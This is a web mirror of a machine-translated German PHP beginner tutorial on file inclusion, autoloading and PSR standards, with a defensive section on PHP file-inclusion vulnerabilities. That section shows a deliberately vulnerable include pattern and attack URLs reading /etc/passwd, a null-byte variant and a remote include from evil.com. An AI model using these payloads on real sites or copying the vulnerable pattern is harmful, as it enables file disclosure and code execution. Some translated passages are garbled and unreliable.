<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134228602-6"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134228602-6');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>🛅 📞 🧘 PHP für Anfänger. Dateiverbindung 🌁 👯 👩🏾‍🔬</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="In der Fortsetzung der PHP for Beginners-Reihe wird sich der heutige Artikel darauf konzentrieren, wie PHP Dateien sucht und verbindet. 

 Warum und w...">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <link href="https://fonts.googleapis.com/css?family=Quicksand&display=swap" rel="stylesheet">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script>document.write('<script src="//pagea' + 'd2.googles' + 'yndication.com/pagea' + 'd/js/a' + 'dsby' + 'google.js"><\/script>')</script>
  <script>
        var superSpecialObject = {};
        superSpecialObject['google_a' + 'd_client'] = 'ca-p' + 'ub-6974184241884155';
        superSpecialObject['enable_page_level_a' + 'ds'] = true;
       (window['a' + 'dsbygoogle'] = window['a' + 'dsbygoogle'] || []).push(superSpecialObject);
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly-es.github.io/index.html"></a>
    <div class="page-header-text">Geekly articles weekly</div>
  </header>
  <section class="page js-page"><h1>PHP für Anfänger. Dateiverbindung</h1><div class="post__body post__body_full"><div class="post__text post__text-html post__text_v1" id="post-content-body" data-io-article-url="https://habr.com/ru/post/439618/"><div style="text-align:center;"><img src="https://habrastorage.org/getpro/habr/post_images/7f2/13e/83b/7f213e83b178b352cfdda06ff16a639f.png" alt="Bild"></div><br><br>  In der Fortsetzung der PHP for Beginners-Reihe wird sich der heutige Artikel darauf konzentrieren, wie PHP Dateien sucht und verbindet. <br><a name="habracut"></a><br><h3>  Warum und warum </h3><br>  PHP ist eine Skriptsprache, die ursprünglich für die schnelle Gestaltung von Homepages entwickelt wurde (ja, ja, ursprünglich war es ursprünglich Personal Home Age Tools). Später wurden auf dem Knie Geschäfte, soziale Programme und andere Handwerke erstellt, die über das beabsichtigte Maß hinausgingen , aber warum bin ich - und die Tatsache, dass je mehr Funktionalität codiert ist, desto größer ist der Wunsch, sie korrekt zu strukturieren, Code-Duplikationen zu beseitigen, sie in logische Teile zu zerlegen und nur bei Bedarf eine Verbindung herzustellen (dies ist das gleiche Gefühl, das Sie hatten, als du hast es schon mal gelesen  Position könnte es in einzelne Teile zerbrochen werden).  Zu diesem Zweck verfügt PHP über mehrere Funktionen, deren allgemeine Bedeutung darin besteht, die angegebene Datei zu verbinden und zu interpretieren.  Schauen wir uns ein Beispiel für das Verbinden von Dateien an: <br><br><pre><code class="php hljs"><span class="hljs-comment"><span class="hljs-comment">// file variable.php $a = 0; // file increment.php $a++; // file index.php include ('variable.php'); include ('increment.php'); include ('increment.php'); echo $a;</span></span></code> </pre> <br>  Wenn Sie das Skript <em>index.php</em> ausführen, stellt PHP eine Verbindung her und führt dies alles nacheinander aus: <br><br><pre> <code class="php hljs">$a = <span class="hljs-number"><span class="hljs-number">0</span></span>; $a++; $a++; <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> $a; <span class="hljs-comment"><span class="hljs-comment">//  2</span></span></code> </pre><br>  Wenn eine Datei verbunden ist, befindet sich ihr Code im selben Bereich wie die Zeile, in der sie verbunden war, sodass alle in dieser Zeile verfügbaren Variablen in der enthaltenen Datei verfügbar sind.  Wenn Klassen oder Funktionen in der Include-Datei deklariert wurden, fallen sie in den globalen Bereich (es sei denn, für sie wurde natürlich ein Namespace angegeben). <br><br>  Wenn Sie die Datei innerhalb der Funktion verbinden, erhalten die enthaltenen Dateien Zugriff auf den Funktionsumfang, sodass auch der folgende Code funktioniert: <br><br><pre> <code class="php hljs"><span class="hljs-function"><span class="hljs-keyword"><span class="hljs-function"><span class="hljs-keyword">function</span></span></span><span class="hljs-params"><span class="hljs-function"><span class="hljs-params">()</span></span></span><span class="hljs-function"> </span></span>{ $a = <span class="hljs-number"><span class="hljs-number">0</span></span>; <span class="hljs-keyword"><span class="hljs-keyword">include</span></span> (<span class="hljs-string"><span class="hljs-string">'increment.php'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">include</span></span> (<span class="hljs-string"><span class="hljs-string">'increment.php'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">echo</span></span> $a; } a(); <span class="hljs-comment"><span class="hljs-comment">//  2</span></span></code> </pre><br><blockquote>  Separat <code>__DIR__</code> ich die <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">magischen Konstanten fest</a> : <code>__DIR__</code> , <code>__FILE__</code> , <code>__LINE__</code> und andere - sie sind an den Kontext gebunden und werden ausgeführt, bevor die Aufnahme erfolgt </blockquote>  Die Besonderheit beim Verbinden von Dateien besteht darin, dass beim Verbinden einer Datei beim Parsen in den HTML-Modus gewechselt wird. Aus diesem Grund muss jeder Code in der enthaltenen Datei in PHP-Tags eingeschlossen sein: <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-comment"><span class="hljs-comment">//   // ... // </span><span class="hljs-meta"><span class="hljs-comment"><span class="hljs-meta">?&gt;</span></span></span></span></code> </pre><br>  Wenn Sie nur PHP-Code in der Datei haben, ist es üblich, das schließende Tag wegzulassen, um nicht versehentlich einen Zeichenfaden nach dem schließenden Tag zu vergessen, der mit Problemen behaftet ist (ich werde dies im nächsten Artikel diskutieren). <br><blockquote>  Haben Sie eine Site-Datei mit 10.000 Zeilen gesehen?  Schon Tränen in meinen Augen (╥_╥) ... </blockquote><h3>  Dateiverbindungsfunktionen </h3><br>  Wie oben erwähnt, gibt es in PHP verschiedene Funktionen zum Verbinden von Dateien: <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">include</a> - schließt die angegebene Datei ein und führt sie aus, wenn sie nicht gefunden wird - gibt eine Warnung <code>E_WARNING</code> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">include_once</a> - ähnelt der obigen Funktion, enthält jedoch die Datei einmal </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">require</a> - schließt die angegebene Datei ein und führt sie aus, wenn sie nicht gefunden wird - gibt es einen schwerwiegenden Fehler <code>E_ERROR</code> </li><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">require_once</a> - ähnlich der obigen Funktion, enthält jedoch die Datei einmal </li></ul><br><blockquote>  In Wirklichkeit handelt es sich hierbei nicht genau um Funktionen, sondern um spezielle Sprachkonstrukte, und Klammern können weggelassen werden.  Unter anderem gibt es andere Möglichkeiten, Dateien zu verbinden und auszuführen, aber graben Sie es selbst, lassen Sie es für Sie eine „Aufgabe mit einem Sternchen“ sein;) </blockquote>  Nehmen wir ein Beispiel für die Unterschiede zwischen <code>require</code> und <code>require_once</code> . Nehmen <em>wir</em> eine <em>echo.php-</em> Datei: <br><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">p</span></span></span><span class="hljs-tag">&gt;</span></span>text of file echo.php<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">p</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  Und wir werden es mehrmals verbinden: <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> <span class="hljs-comment"><span class="hljs-comment">//     //  1 require_once 'echo.php'; //    , ..   //  true require_once 'echo.php'; //     //  1 require 'echo.php';</span></span></code> </pre><br>  Das Ergebnis der Ausführung sind zwei Verbindungen zur Datei <em>echo.php</em> : <br><br><pre> <code class="xml hljs"><span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">p</span></span></span><span class="hljs-tag">&gt;</span></span>text of file echo.php<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">p</span></span></span><span class="hljs-tag">&gt;</span></span> <span class="hljs-tag"><span class="hljs-tag">&lt;</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">p</span></span></span><span class="hljs-tag">&gt;</span></span>text of file echo.php<span class="hljs-tag"><span class="hljs-tag">&lt;/</span><span class="hljs-name"><span class="hljs-tag"><span class="hljs-name">p</span></span></span><span class="hljs-tag">&gt;</span></span></code> </pre><br>  Es gibt einige weitere Anweisungen, die sich auf die Verbindung auswirken, aber Sie benötigen sie nicht - <a href="">auto_prepend_file</a> und <a href="">auto_append_file</a> .  Mit diesen Anweisungen können Sie Dateien installieren, die verbunden werden, bevor alle Dateien verbunden sind bzw. nachdem alle Skripts ausgeführt wurden.  Ich kann mir nicht einmal ein "Live" -Szenario ausdenken, wenn es erforderlich sein könnte. <br><br><div class="spoiler">  <b class="spoiler_title">Aufgabe</b> <div class="spoiler_text">  Sie können ein Skript für die Verwendung der <code>auto_prepend_file</code> und <code>auto_append_file</code> <code>auto_prepend_file</code> und <code>auto_append_file</code> . Sie können diese nur in <em>php.ini</em> , <em>.htaccess</em> oder <em>httpd.conf ändern</em> (siehe <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">PHP_INI_PERDIR</a> ) :) <br></div></div><br><h3>  Wo sucht? </h3><br>  PHP sucht nach Include-Dateien in Verzeichnissen, die in der Anweisung <a href="">include_path</a> angegeben sind.  Diese Anweisung wirkt sich auch auf den Betrieb von <code>fopen()</code> , <code>file()</code> , <code>readfile()</code> und <code>file_get_contents()</code> .  Der Algorithmus ist recht einfach: Bei der Suche nach Dateien überprüft PHP abwechselnd jedes Verzeichnis von <code>include_path</code> , bis eine zu verbindende Datei gefunden wird. Wenn dies nicht der Fall ist, wird ein Fehler zurückgegeben.  Verwenden Sie die Funktion <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">set_include_path (),</a> um <code>include_path</code> aus einem Skript zu ändern. <br><br>  Beim Einrichten von <code>include_path</code> ist eine wichtige Sache zu beachten: Unter Windows und Linux werden verschiedene Zeichen als <code>include_path</code> verwendet - ";"  und ":". Wenn Sie also Ihr Verzeichnis <code>PATH_SEPARATOR</code> , verwenden Sie die Konstante <code>PATH_SEPARATOR</code> , zum Beispiel: <br><br><pre> <code class="php hljs"><span class="hljs-comment"><span class="hljs-comment">//    linux $path = '/home/dev/library'; //    windows $path = 'c:\Users\Dev\Library'; //  linux  windows   include_path  set_include_path(get_include_path() . PATH_SEPARATOR . $path);</span></span></code> </pre><br>  Wenn Sie <code>include_path</code> in eine <code>include_path</code> Datei schreiben, können Sie Umgebungsvariablen wie <code>${USER}</code> : <br><br> <code>include_path = ".:${USER}/my-php-library" <br></code> <br><br>  Wenn Sie beim Verbinden der Datei einen absoluten Pfad (beginnend mit "/") oder einen relativen Pfad (beginnend mit "." Oder "..") <code>include_path</code> wird die Anweisung <code>include_path</code> ignoriert und die Suche wird nur für den angegebenen Pfad ausgeführt. <br><blockquote>  Vielleicht lohnt es sich, über <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">safe_mode</a> zu sprechen, aber dies ist seit langem eine Geschichte (seit Version 5.4), und ich hoffe, Sie werden nicht darauf stoßen, aber wenn plötzlich, dann wissen Sie, was es war, aber es ist vorbei ... </blockquote><h3>  Return verwenden </h3><br>  Ich erzähle Ihnen von einem kleinen Life-Hack. Wenn die enthaltene Datei mithilfe des <code>return</code> Konstrukts etwas zurückgibt, können diese Daten abgerufen und verwendet werden, sodass Sie die Verbindung von Konfigurationsdateien einfach organisieren können. Ich werde ein Beispiel zur Veranschaulichung geben: <br><br><pre> <code class="php hljs"><span class="hljs-keyword"><span class="hljs-keyword">return</span></span> [ <span class="hljs-string"><span class="hljs-string">'host'</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">'localhost'</span></span>, <span class="hljs-string"><span class="hljs-string">'user'</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">'root'</span></span>, <span class="hljs-string"><span class="hljs-string">'pass'</span></span> =&gt; <span class="hljs-string"><span class="hljs-string">''</span></span> ];</code> </pre><br><pre> <code class="php hljs">$dbConfig = <span class="hljs-keyword"><span class="hljs-keyword">require</span></span> <span class="hljs-string"><span class="hljs-string">'config/db.php'</span></span>; var_dump($dbConfig); <span class="hljs-comment"><span class="hljs-comment">/* array( 'host' =&gt; 'localhost', 'user' =&gt; 'root', 'pass' =&gt; '' ) */</span></span></code> </pre><br><blockquote>  Interessante Fakten, ohne die es auch gut war: Wenn Funktionen in der enthaltenen Datei definiert sind, können sie in der Hauptdatei verwendet werden, unabhängig davon, ob sie vor oder nach der Rückgabe deklariert wurden </blockquote><div class="spoiler">  <b class="spoiler_title">Aufgabe</b> <div class="spoiler_text">  Schreiben Sie Code, der die Konfiguration aus mehreren Ordnern und Dateien sammelt.  Die Dateistruktur ist wie folgt: <br><br><pre> <code class="plaintext hljs">config |-- default | |-- db.php | |-- debug.php | |-- language.php | `-- template.php |-- development | `-- db.php `-- production |-- db.php `-- language.php</code> </pre><br>  In diesem Fall sollte der Code wie folgt funktionieren: <br><br><ul><li>  Wenn es in der Systemumgebung eine <code>PROJECT_PHP_SERVER</code> Variable gibt, die der <code>development</code> , sollten alle Dateien aus dem <em>Standardordner</em> verbunden sein, die Daten sollten in der Variablen <code>$config</code> , die Dateien aus dem <em>Entwicklungsordner</em> sollten verbunden sein und die empfangenen Daten sollten die entsprechenden in <code>$config</code> gespeicherten Elemente schleifen </li><li>  ähnliches Verhalten, wenn <code>PROJECT_PHP_SERVER</code> <code>production</code> (natürlich nur für den <em>Produktionsordner</em> ) </li><li>  Wenn keine Variable vorhanden oder falsch eingestellt ist, werden nur Dateien aus dem <em>Standardordner</em> verbunden </li></ul><br></div></div><br><h3>  Automatische Verbindung </h3><br>  Konstrukte mit Dateianhängen sehen sehr sperrig aus und folgen auch ihrem Update - ein weiteres Geschenk: Lesen Sie einen Code aus dem Beispielartikel <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">über Ausnahmen</a> : <br><br><pre> <code class="php hljs"><span class="hljs-comment"><span class="hljs-comment">// load all files w/out autoloader require_once 'Education/Command/AbstractCommand.php'; require_once 'Education/CommandManager.php'; require_once 'Education/Exception/EducationException.php'; require_once 'Education/Exception/CommandManagerException.php'; require_once 'Education/Exception/IllegalCommandException.php'; require_once 'Education/RequestHelper.php'; require_once 'Education/Front.php';</span></span></code> </pre><br>  Der erste Versuch, ein solches „Glück“ zu vermeiden, war das Auftreten der <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">__autoload-</a> Funktion.  Genauer gesagt, es war nicht einmal eine bestimmte Funktion, Sie mussten diese Funktion selbst definieren und damit die Dateien verbinden, die wir über den Klassennamen benötigten.  Die einzige Regel war, dass <strong>für jede Klasse eine separate Datei mit dem Namen der Klasse</strong> <i>erstellt werden</i> sollte (d. H. <i>MyClass</i> sollte sich in der Datei <i>myClass.php befinden</i> ).  Hier ist ein Beispiel für die Implementierung einer solchen Funktion <code>__autoload()</code> (entnommen aus Kommentaren im offiziellen Handbuch): <br><br>  Die Klasse, die wir verbinden werden: <br><br><pre> <code class="php hljs"><span class="hljs-comment"><span class="hljs-comment">//  myClass    myClass.php class myClass { public function __construct() { echo "myClass init'ed successfuly!!!"; } }</span></span></code> </pre><br>  Die Datei, die diese Klasse verbindet: <br><br><pre> <code class="php hljs"><span class="hljs-comment"><span class="hljs-comment">//   //     include_path function __autoload($classname) { $filename = $classname .".php"; include_once $filename; } //   $obj = new myClass();</span></span></code> </pre><br>  Nun zu den Problemen mit dieser Funktion - stellen Sie sich eine Situation vor, in der Sie Code von Drittanbietern verbinden und dort bereits jemand die Funktion <code>__autoload()</code> für Ihren Code registriert hat, und voila: <br><br><pre> <code class="php hljs">Fatal error: Cannot redeclare __autoload()</code> </pre><br>  Um dies zu vermeiden, haben wir eine Funktion erstellt, mit der Sie eine beliebige Funktion oder Methode als Klassenladeprogramm registrieren können - <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">spl_autoload_register</a> .  Das heißt,  Wir können mehrere Funktionen mit einem beliebigen Namen zum Laden von Klassen erstellen und sie mit <code>spl_autoload_register</code> registrieren.  Jetzt sieht <code>index.php</code> aus: <br><br><pre> <code class="php hljs"><span class="hljs-comment"><span class="hljs-comment">//   //     include_path function myAutoload($classname) { $filename = $classname .".php"; include_once($filename); } //   spl_autoload_register('myAutoload'); //   $obj = new myClass();</span></span></code> </pre><br><blockquote>  Die Überschrift „ <code>spl_autoload_register()</code> Sie schon?“: Der erste Parameter <code>spl_autoload_register()</code> ist optional. <code>spl_autoload_register()</code> die Funktion ohne diesen Parameter <code>spl_autoload_register()</code> , wird die Funktion <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">spl_autoload</a> als Loader verwendet. Die Suche wird für Ordner aus <code>include_path</code> und Dateien mit der Erweiterung <code>.php</code> und <code>.inc</code> Die Liste kann mit der Funktion <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">spl_autoload_extensions</a> erweitert werden </blockquote>  Jetzt kann jeder Entwickler seinen Loader registrieren. Hauptsache, die Klassennamen stimmen nicht überein. Dies sollte jedoch kein Problem sein, wenn Sie Namespaces verwenden. <br><blockquote>  Da eine erweiterte Funktionalität wie <code>spl_autoload_register()</code> schon lange existiert, ist die Funktion <code>spl_autoload_register()</code> <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">in PHP 7.1</a> bereits als <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">veraltet</a> deklariert, was bedeutet, dass diese Funktion in absehbarer Zukunft vollständig entfernt wird (X_x). </blockquote>  Nun, das Bild hat sich mehr oder weniger geklärt, obwohl alle registrierten Bootloader in der Warteschlange stehen, sobald sie registriert sind. Wenn ihn jemand in seinen Bootloader hineingelockt hat, wird anstelle des erwarteten Ergebnisses ein sehr unangenehmer Fehler auftreten.  Um dies zu verhindern, haben erwachsene Smart-Jungs einen Standard beschrieben, mit dem Sie problemlos Bibliotheken von Drittanbietern verbinden können. Hauptsache, die Organisation der Klassen in ihnen entspricht dem <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">PSR-0-</a> Standard (der bereits 10 Jahre alt ist) oder <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">PSR-4</a> .  Was ist das Wesentliche der in den Normen beschriebenen Anforderungen: <br><br><ol><li>  Jede Bibliothek muss in einem eigenen Namespace (dem sogenannten Vendor Namespace) leben. </li><li>  Jeder Namespace muss einen eigenen Ordner haben. </li><li>  Innerhalb des Namespace können sich Unterräume befinden - auch in separaten Ordnern </li><li>  Eine Klasse - eine Datei </li><li>  Der Dateiname mit der Erweiterung <code>.php</code> muss genau mit dem <code>.php</code> übereinstimmen </li></ol><br>  Beispiel aus dem Handbuch: <br><table><tbody><tr><th>  Vollständiger Klassenname </th><th>  Namespace </th><th>  Basisverzeichnis </th><th>  Voller Weg </th></tr></tbody><tbody><tr><td>  \ Acme \ Log \ Writer \ File_Writer </td><td>  Acme \ Log \ Writer </td><td>  ./acme-log-writer/lib/ </td><td>  ./acme-log-writer/lib/File_Writer.php </td></tr><tr><td>  \ Aura \ Web \ Response \ Status </td><td>  Aura \ Web </td><td>  / path / to / aura-web / src / </td><td>  /path/to/aura-web/src/Response/Status.php </td></tr><tr><td>  \ Symfony \ Core \ Request </td><td>  Symfony \ core </td><td>  ./Vendor/Symfony/Core/ </td><td>  ./vendor/Symfony/Core/Request.php </td></tr><tr><td>  \ Zend \ Acl </td><td>  Zend </td><td>  / usr / enthält / Zend / </td><td>  /usr/includes/Zend/Acl.php </td></tr></tbody></table><br><br>  Die Unterschiede zwischen diesen beiden Standards bestehen darin, dass PSR-0 alten Code ohne Namespace unterstützt (d. H. Vor Version 5.3.0) und PSR-4 frei von diesem Anachronismus ist und sogar unnötiges Verschachteln von Ordnern vermeidet. <br><br>  Dank dieser Standards wurde es möglich, ein solches Tool wie <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Composer zu entwickeln</a> - einen universellen Paketmanager für PHP.  Wenn jemand etwas verpasst hat, gibt es einen guten Bericht von <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=" class="user_link">pronskiy</a> über dieses Tool. <br><br><iframe width="560" height="315" src="https://www.youtube.com/embed/cpdJR0D8ZV8" frameborder="0" allow="accelerometer; autoplay; encrypted-media; gyroscope; picture-in-picture" allowfullscreen=""></iframe><br><h3>  PHP-Injektion </h3><br>  Ich wollte auch über den ersten Fehler aller sprechen, die einen einzigen Einstiegspunkt für die Site in einer <code>index.php</code> und diese als MVC-Framework bezeichnen: <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> $page = $_GET[<span class="hljs-string"><span class="hljs-string">'page'</span></span>] ?? <span class="hljs-keyword"><span class="hljs-keyword">die</span></span>(<span class="hljs-string"><span class="hljs-string">'Wrong filename'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (!is_file($page)) { <span class="hljs-keyword"><span class="hljs-keyword">die</span></span>(<span class="hljs-string"><span class="hljs-string">'Wrong filename'</span></span>); } <span class="hljs-keyword"><span class="hljs-keyword">include</span></span> $page;</code> </pre><br>  Sie sehen sich den Code an und möchten dort nur etwas Bösartiges übertragen: <br><br><pre> <code class="bash hljs">//     http://domain.com/index.php?page=../index.php //      http://domain.com/index.php?page=config.ini //    http://domain.com/index.php?page=/etc/passwd //  ,       http://domain.com/index.php?page=user/backdoor.php</code> </pre><br>  Das erste, was mir in den Sinn kommt, ist das gewaltsame Hinzufügen der <code>.php</code> Erweiterung. In einigen Fällen kann sie jedoch "dank" einer <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Null-Byte-Sicherheitsanfälligkeit</a> umgangen werden (lesen Sie, diese Sicherheitsanfälligkeit wurde schon <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">lange behoben</a> , aber plötzlich stoßen Sie auf einen Interpreter, der älter als PHP 5.3 ist allgemeine Entwicklung empfehlen auch): <br><br><pre> <code class="bash hljs">//    http://domain.com/index.php?page=/etc/passwd%00</code> </pre><br><blockquote>  In modernen PHP-Versionen führt das Vorhandensein eines Null-Byte-Zeichens im Pfad der verbundenen Datei sofort zu dem entsprechenden Verbindungsfehler. Selbst wenn die angegebene Datei vorhanden ist und verbunden werden kann, ist das Ergebnis immer ein Fehler. Es wird wie folgt überprüft: <code>strlen(Z_STRVAL_P(inc_filename)) != Z_STRLEN_P(inc_filename)</code> (dies ist aus dem Darm von PHP selbst) </blockquote>  Der zweite „lohnende“ Gedanke ist die Suche nach einer Datei im aktuellen Verzeichnis: <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> $page = $_GET[<span class="hljs-string"><span class="hljs-string">'page'</span></span>] ?? <span class="hljs-keyword"><span class="hljs-keyword">die</span></span>(<span class="hljs-string"><span class="hljs-string">'Wrong filename'</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">if</span></span> (strpos(realpath($page), <span class="hljs-keyword"><span class="hljs-keyword">__DIR__</span></span>) !== <span class="hljs-number"><span class="hljs-number">0</span></span>) { <span class="hljs-keyword"><span class="hljs-keyword">die</span></span>(<span class="hljs-string"><span class="hljs-string">'Wrong path to file'</span></span>); } <span class="hljs-keyword"><span class="hljs-keyword">include</span></span> $page . <span class="hljs-string"><span class="hljs-string">'.php'</span></span>;</code> </pre><br>  Die dritte, aber nicht die letzte Änderung der Prüfung ist die Verwendung der <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">open_basedir-</a> Direktive. Mit ihrer Hilfe können Sie das Verzeichnis angeben, in dem genau PHP nach zu verbindenden Dateien sucht: <br><br><pre> <code class="php hljs"><span class="hljs-meta"><span class="hljs-meta">&lt;?php</span></span> $page = $_GET[<span class="hljs-string"><span class="hljs-string">'page'</span></span>] ?? <span class="hljs-keyword"><span class="hljs-keyword">die</span></span>(<span class="hljs-string"><span class="hljs-string">'Wrong filename'</span></span>); ini_set(<span class="hljs-string"><span class="hljs-string">'open_basedir'</span></span>, <span class="hljs-keyword"><span class="hljs-keyword">__DIR__</span></span>); <span class="hljs-keyword"><span class="hljs-keyword">include</span></span> $page . <span class="hljs-string"><span class="hljs-string">'.php'</span></span>;</code> </pre><br><blockquote>  Seien Sie vorsichtig, diese Anweisung wirkt sich nicht nur auf die Verbindung von Dateien aus, sondern funktioniert auch mit dem Dateisystem, d. H.  Mit dieser Einschränkung müssen Sie sicherstellen, dass Sie nichts außerhalb des angegebenen Verzeichnisses vergessen haben, weder die zwischengespeicherten Daten noch Benutzerdateien (obwohl die Funktionen <code>is_uploaded_file()</code> und <code>move_uploaded_file()</code> weiterhin mit einem temporären Ordner für heruntergeladene Dateien funktionieren). </blockquote>  Welche anderen Prüfungen sind möglich?  Viele Optionen hängen von der Architektur Ihrer Anwendung ab. <br><br>  Ich wollte auch an die Existenz einer „wunderbaren“ Anweisung <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">allow_url_include</a> erinnern (dies hängt von <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">allow_url_fopen ab</a> ), mit der Sie Remote-PHP-Dateien verbinden und ausführen können, was für Ihren Server viel gefährlicher ist: <br><br><pre> <code class="php hljs"><span class="hljs-comment"><span class="hljs-comment">//   PHP  http://domain.com/index.php?page=http://evil.com/index.php</span></span></code> </pre><br>  Säge, erinnere dich und benutze es nie. Der Vorteil ist standardmäßig deaktiviert.  Sie benötigen diese Funktion etwas weniger als je zuvor. In allen anderen Fällen legen Sie die richtige Anwendungsarchitektur fest, bei der verschiedene Teile der Anwendung über die API kommunizieren. <br><br><div class="spoiler">  <b class="spoiler_title">Aufgabe</b> <div class="spoiler_text">  Schreiben Sie ein Skript, mit dem Sie PHP-Skripte aus dem aktuellen Ordner nach Namen verbinden können, während Sie sich an mögliche Schwachstellen erinnern und Fehler vermeiden. <br></div></div><br><h3>  Abschließend </h3><br>  Dieser Artikel ist die Basis in PHP. Studieren Sie also sorgfältig, erledigen Sie Aufgaben und archivieren Sie nicht, niemand wird für Sie unterrichten. <br><br><h3>  PS </h3><br>  Dies ist ein <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Repost</a> aus einer Reihe von Artikeln "PHP für Anfänger": <br><br><ul><li>  <a href="https://translate.googleusercontent.com/translate_c?depth=1&amp;rurl=translate.google.com&amp;sl=ru&amp;sp=nmt4&amp;tl=de&amp;u=">Die Sitzung</a> </li><li>  <b>Dateiverbindung</b> </li></ul><br>  Wenn Sie Kommentare zum Material des Artikels oder möglicherweise in Form haben, beschreiben Sie das Wesentliche in den Kommentaren, und wir werden dieses Material noch besser machen. </div></div><p>Source: <a rel="nofollow" href="https://habr.com/ru/post/de439618/">https://habr.com/ru/post/de439618/</a></p>
